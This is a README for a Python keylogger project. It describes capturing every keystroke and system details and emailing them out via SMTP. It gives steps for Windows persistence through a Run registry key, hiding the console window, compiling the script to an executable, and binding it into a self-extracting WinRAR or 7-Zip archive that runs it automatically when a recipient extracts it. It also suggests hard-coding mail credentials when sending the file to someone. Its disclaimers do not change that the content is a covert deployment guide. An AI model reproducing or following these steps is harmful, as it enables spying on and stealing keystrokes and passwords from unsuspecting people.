# Keylogger

**IMPORTANT**: This project demonstrates how to capture keystrokes on a system. Using a keylogger without explicit authorization is illegal and unethical. Please read the disclaimer below before proceeding.

## Table of Contents
1. [Overview](#overview)  
2. [Features](#features)  
3. [Installation](#installation)  
4. [Configuration](#configuration)  
5. [Usage](#usage)  
6. [Optional Windows Features](#optional-windows-features)
7. [Next Steps](#optional-next-step)
8. [Disclaimer](#disclaimer)  
9. [License](#license)

---

## Overview
This Python-based keylogger logs keystrokes and collects system information (hostname, IP addresses, OS version, etc.). It can optionally send these logs via email. The key features include:

- Recording and storing keystrokes in a local file.  
- Collecting basic system info (OS, IP, hostname, etc.).  
- **Optional**: Automatically emailing logged data.  
- **Optional**: Adding itself to Windows Startup and hiding the console (for stealth).

> **Use Cases**:  
> - Educational or personal security checks (e.g., monitoring a test machine you own).  
> - Testing out code injection or stealth techniques (with legal permission).

---

## Features
1. **Keylogging**  
   - Records all standard keystrokes.  
   - Special keys (e.g., Tab, Enter, Backspace, Arrow keys) are wrapped in angle brackets for clarity (e.g., `<TAB>`, `<ENTER>`).  
2. **System Information**  
   - Collects internal/external IP, OS, processor info, hostname, etc.  
   - Logs the results in a separate file (`sysinfo.txt`).  
3. **Email Integration**  
   - Sends the collected logs via SMTP (Gmail by default).  
   - Credentials can be passed via environment variables.  
4. **Optional Windows-Specific Features**  
   - **Startup Registration**: Adds a registry key so the script runs upon login.  
   - **Hide Console Window**: Minimizes or hides the console for stealth.

---

## Installation
1. **Clone or Download** this repository:
   ```bash
   git clone https://github.com/viditsirohi/keylogger.git
   cd keylogger
   ```

2. **Install Python 3** (if not already installed).  
   - [Download Python 3](https://www.python.org/downloads/)

3. **Install Dependencies**:
   ```bash
   pip install pynput pywin32
   ```
   - `pynput` is required for capturing keystrokes.  
   - `pywin32` is only necessary for Windows-specific functionality (e.g., hiding console, modifying registry).  
   - The standard library modules (`smtplib`, `logging`, etc.) come with Python by default.

---

## Configuration
1. **Email Credentials** (if using email sending):
   - **Recommended**: Set the following environment variables:
     ```bash
     export LOG_MAIL_ADDRESS="your_email@gmail.com"
     export LOG_MAIL_PASSWORD="your_secure_password"
     ```
   - On Windows PowerShell:
     ```powershell
     $env:LOG_MAIL_ADDRESS="your_email@gmail.com"
     $env:LOG_MAIL_PASSWORD="your_secure_password"
     ```
   - Alternatively, you can **hard-code** them in the script if you're sending this to someone.

2. **Script Settings**:
   - `SYSINFO_FILE` (default `"sysinfo.txt"`)  
   - `KEYLOG_FILE` (default `"log.txt"`)  
   - `KEYS_BEFORE_WRITE` (default `20`) controls how many keystrokes are batched before writing to the log file.  
   - `SMTP_SERVER` and `SMTP_PORT` can be changed if you’re using a mail provider other than Gmail.

---

## Usage
1. **Navigate to the Script’s Directory**:
   ```bash
   cd keylogger
   ```

2. **Run the Keylogger**:
   ```bash
   python keylogger.py
   ```
   - The script will collect system info, attempt to send it via email (if credentials are set), and then start recording keystrokes.

3. **Stopping the Keylogger**:  
   - Press the **Esc** key at any time to end the keylogger.  
   - Once stopped, it will (optionally) send the `log.txt` file via email if credentials are set.

4. **Check Output**:
   - `sysinfo.txt` will contain your system’s info.  
   - `log.txt` will contain recorded keystrokes with time-stamped sessions.

---

## Optional Windows Features

### Add to Windows Startup
In the `main()` function of `keylogger.py`, uncomment:
```python
add_to_windows_startup("MyKeylogger")
```
> **Note**: This modifies Windows Registry keys under `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.  
> Make sure you understand and have permission before doing this.

### Hide the Console
In `main()`:
```python
hide_console()
```
> This uses `win32console` and `win32gui` to hide the script’s console window.  

Use these options *only if* you need them and have appropriate permissions.

---

## Optional Next Step

### 1. Create a Binary Executable
You can convert the Python script into an executable file using tools like:
- [PyInstaller](https://www.pyinstaller.org/)  
- [py2exe](https://www.py2exe.org/)  

For **PyInstaller**, for example:
```bash
pip install pyinstaller
pyinstaller --onefile keylogger.py
```
This will create a standalone executable (e.g., `keylogger.exe` on Windows) in the `dist` folder.

### 2. Create a Self-Extracting ZIP or Archive
You can then bundle this executable inside a self-extracting archive (SFX), or use specialized software that allows you to:
1. Include the `keylogger.exe` (or similarly named file) in the ZIP.  
2. Configure the SFX or archive so that it **automatically runs** `keylogger.exe` when the ZIP is extracted.  

Some archivers (e.g., **WinRAR**, **7-Zip**) let you specify a “setup program” that automatically runs upon extraction. You would configure this in the archiver settings:

- **WinRAR**:  
  - Create an SFX archive (from the **Options** > **SFX** menu).  
  - In **Advanced SFX options**, set the `Setup` or `Run after extraction` field to `keylogger.exe`.  

- **7-Zip** (using 7z SFX builder):  
  - Similar procedure where you specify a `RunProgram` directive.

> **Note**: This approach effectively **binds** the keylogger executable to the extracted files, causing it to run immediately after someone opens and extracts the ZIP. This is *highly invasive* and often used for malicious intent. Use it **only** for ethical, transparent purposes (e.g., your own testing environment, with full user consent).

### 3. Test Thoroughly
- **Antivirus Alerts**: Many antivirus products will flag such executables.  
- **System Compatibility**: Ensure your script/executable runs on the target OS (e.g., Windows vs. macOS).  
- **Legal and Ethical Compliance**: Once again, do not distribute such files without explicit permission and disclosure.

---

## Disclaimer
**Unauthorized usage of this script is illegal and unethical.**  
You must have **explicit consent** from the owner/user of the machine on which you run this code. The author(s) assume no responsibility for any misuse of this software. This project is provided for **educational** and **demonstration** purposes only.

---

## License
This project is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the code under the conditions of the license.  

**Please use responsibly.**
